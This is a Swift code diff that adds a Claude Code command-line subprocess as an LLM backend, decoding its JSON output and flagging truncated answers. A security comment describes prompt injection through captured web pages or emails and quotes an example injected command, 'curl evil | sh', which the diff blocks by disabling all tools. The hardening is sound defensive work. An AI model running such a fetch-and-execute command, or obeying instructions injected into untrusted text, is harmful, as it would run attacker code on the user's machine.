@@ -74,12 +74,91 @@ actor LLMClient {
     func chat(_ cfg: LLMConfig, system: String, user: String,
               maxTokens: Int, timeout: TimeInterval) async throws -> ChatOutput {
         try cfg.validate()
+        // Claude Code is a local subprocess, not an HTTP endpoint — dispatch before the wire switch.
+        // maxTokens isn't forwarded: the Claude Code CLI has no output-token cap flag (see claudeCodeChat).
+        if cfg.provider.isSubprocess {
+            return try await claudeCodeChat(cfg, system: system, user: user, timeout: timeout)
+        }
         switch cfg.provider.wire {
         case .openAICompatible:
             return try await openAIChat(cfg, system: system, user: user, maxTokens: maxTokens, timeout: timeout)
         case .anthropicMessages:
             return try await anthropicChat(cfg, system: system, user: user, maxTokens: maxTokens, timeout: timeout)
         }
+    }
+
+    // MARK: Claude Code (local CLI subprocess — no API key, no URLSession)
+
+    /// The shape of `claude -p --output-format json`: we only need `result` (the answer) plus the
+    /// error/stop flags. Everything else in the payload (usage, cost, ids) is ignored.
+    private struct ClaudeCodeResult: Decodable {
+        let result: String?
+        let is_error: Bool?
+        let subtype: String?
+        let stop_reason: String?
+    }
+
+    /// Path to the `claude` binary. The shared locator is the SINGLE source of truth: it caches, and its
+    /// `refresh()` (the "Re-check" button) invalidates that cache. We keep NO second cache here — a stale
+    /// copy would survive a refresh and keep invoking a moved/reinstalled binary at the old path.
+    private func claudePath() async throws -> String {
+        guard let p = await ClaudeCodeLocator.shared.resolve() else {
+            throw AutomationError.llm("Claude Code not found — install it and run `claude` once to sign in.")
+        }
+        return p
+    }
+
+    /// Run the user's authenticated Claude Code CLI as a subprocess and map its JSON to ChatOutput.
+    /// Prompt goes on stdin; the system prompt uses `--append-system-prompt` when the CLI supports it,
+    /// otherwise it's prepended to the user prompt. Neither the prompt nor the answer is ever logged.
+    private func claudeCodeChat(_ cfg: LLMConfig, system: String, user: String,
+                                timeout: TimeInterval) async throws -> ChatOutput {
+        let path = try await claudePath()
+        // SECURITY (RCE): `claude -p` would otherwise run as the FULL agent WITH tools (Bash/Edit/Write/
+        // WebFetch/…). Our prompt is UNTRUSTED screen-history text, so an injected "run `curl evil | sh`"
+        // in a captured web page/email could execute on the user's Mac. Lock it to a pure TEXT generator:
+        //   • --tools ""          — empty allow-list of the built-in tool set ⇒ NO Bash/Edit/Write/Read/…
+        //   • --strict-mcp-config — with no --mcp-config, load ZERO MCP servers ⇒ no MCP tools appear either
+        //   • --permission-mode plan — belt-and-suspenders: plan mode never runs a non-read-only tool
+        // Allow-list-empty is deliberate over a deny-list: a deny-list would miss any tool a future CLI adds.
+        var args = ["-p", "--output-format", "json",
+                    "--tools", "",
+                    "--strict-mcp-config",
+                    "--permission-mode", "plan"]
+        // NOTE: the Claude Code CLI exposes NO output-token cap flag, so `maxTokens` cannot be enforced here
+        // (unlike the HTTP providers). We don't pretend to — truncation is detected AFTER the fact from the
+        // CLI's top-level `stop_reason` (see the return below). It also exposes no temperature flag, so —
+        // unlike the other providers, which pin 0.3 — Claude Code uses its own default temperature.
+        let model = cfg.model.trimmingCharacters(in: .whitespacesAndNewlines)
+        if !model.isEmpty, model != AIProvider.claudeCodeDefaultModel {
+            args += ["--model", model]
+        }
+        let prompt: String
+        let trimmedSystem = system.trimmingCharacters(in: .whitespacesAndNewlines)
+        if !trimmedSystem.isEmpty, await ClaudeCodeLocator.shared.supportsAppendSystemPrompt() {
+            args += ["--append-system-prompt", system]
+            prompt = user
+        } else if !trimmedSystem.isEmpty {
+            prompt = system + "\n\n" + user
+        } else {
+            prompt = user
+        }
+
+        let data = try await ClaudeCodeRunner.run(path: path, args: args, stdin: prompt, timeout: timeout)
+        guard let decoded = try? JSONDecoder().decode(ClaudeCodeResult.self, from: data) else {
+            throw AutomationError.llm("unexpected response from Claude Code")
+        }
+        if decoded.is_error == true {
+            throw AutomationError.llm("Claude Code reported an error (\(decoded.subtype ?? "unknown")).")
+        }
+        guard let text = decoded.result,
+              !text.trimmingCharacters(in: .whitespacesAndNewlines).isEmpty else {
+            throw AutomationError.llm("empty model response")
+        }
+        // `claude -p --output-format json` returns a top-level `stop_reason` ("end_turn" on a complete
+        // answer, "max_tokens" if the model hit a cap). That's our only truncation signal — since the CLI
+        // can't be told to cap output, this is post-hoc detection, not a guarantee.
+        return ChatOutput(content: text, truncated: decoded.stop_reason == "max_tokens")
     }
 
     /// `POST {base}/chat/completions` (LM Studio / Ollama / custom / OpenRouter / OpenAI).
